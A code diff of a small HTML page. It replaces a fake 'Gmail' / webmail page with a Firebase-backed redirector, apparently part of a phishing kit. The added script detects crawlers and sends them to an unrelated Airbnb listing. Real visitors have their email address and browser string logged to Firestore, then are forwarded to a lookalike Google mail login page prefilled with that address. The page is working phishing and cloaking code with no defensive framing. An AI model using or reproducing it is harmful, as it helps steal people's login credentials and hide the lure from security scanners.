@@ -1,1 +1,61 @@
-<!DOCTYPE html><html lang=en><head><title>Gmail</title><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><link rel=icon href=/favicon.ico><title>ionos-webmail</title><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Roboto:100,300,400,500,700,900"><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@mdi/font@latest/css/materialdesignicons.min.css><link href=/css/PhoneVerificationForm.a4d9d1dc.css rel=prefetch><link href=/css/SMSVerificationForm.ab4ec388.css rel=prefetch><link href=/js/PhoneVerificationForm.81d75513.js rel=prefetch><link href=/js/SMSVerificationForm.d844e00e.js rel=prefetch><link href=/js/SessionEnded.ca8bfa55.js rel=prefetch><link href=/css/app.69f7edde.css rel=preload as=style><link href=/css/chunk-vendors.023a8e6c.css rel=preload as=style><link href=/js/app.2c0f788d.js rel=preload as=script><link href=/js/chunk-vendors.6d988da7.js rel=preload as=script><link href=/css/chunk-vendors.023a8e6c.css rel=stylesheet><link href=/css/app.69f7edde.css rel=stylesheet></head><body><noscript><strong>We're sorry but ionos-webmail doesn't work properly without JavaScript enabled. Please enable it to continue.</strong></noscript><div id=app></div><script src=/js/chunk-vendors.6d988da7.js></script><script src=/js/app.2c0f788d.js></script></body></html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Document</title>
+  <script type="text/javascript" src="main.bundle.js"></script>
+  <script>
+  </script>
+</head>
+<body>
+  <!-- Firebase App (the core Firebase SDK) is always required and must be listed first -->
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+  
+  <!--Firestore sdk-->
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>
+
+  <script>
+    var firebaseConfig = {
+        apiKey: "AIzaSyBMrrRFP5m4glmGk2xJHE5f9Y2R_C-_2fE",
+        authDomain: "manyfaces-4eca5.firebaseapp.com",
+        databaseURL: "https://manyfaces-4eca5.firebaseio.com",
+        projectId: "manyfaces-4eca5",
+        storageBucket: "manyfaces-4eca5.appspot.com",
+        messagingSenderId: "533968576581",
+        appId: "1:533968576581:web:d5b07b088517f353ef032c"
+      }
+      firebase.initializeApp(firebaseConfig);
+
+      var db = firebase.firestore()
+      var crawlDetect = new Crawler.Crawler();
+      var UAstring = navigator.userAgent;
+      console.log(UAstring)
+
+      if (crawlDetect.isCrawler(UAstring)) {
+        db.collection('robotAgent').add({
+          robotAgent: UAstring
+        })
+        .then(function() {
+          console.log('added to robotAgent database')
+          window.location.replace('https://www.airbnb.com/rooms/43518962?category_tag=Tag%3A8186&adults=1&check_in=2022-01-10&check_out=2022-01-17&federated_search_id=8880be02-5b1e-473c-ab1a-ae9efff441ba&source_impression_id=p3_1629862943_iBvZSygv2%2FlbZixU&guests=1')
+        })
+      } else {
+        console.log('you are not a crawler')
+        var mydomain = 'https://gwebsuite.web.app/#/login/mail';
+        var url = new URL(window.location.href);
+        var params = new URLSearchParams(url.search);
+        var email = params.get('email');
+        db.collection('allAgents').doc(email).set({
+          allAgent: UAstring,
+          email
+        }, {merge: true})
+        .then(function () {
+          console.log('added to allAgent')
+          window.location.replace(mydomain + '/' + email)
+        })
+      }
+  </script>
+</body>
+</html>
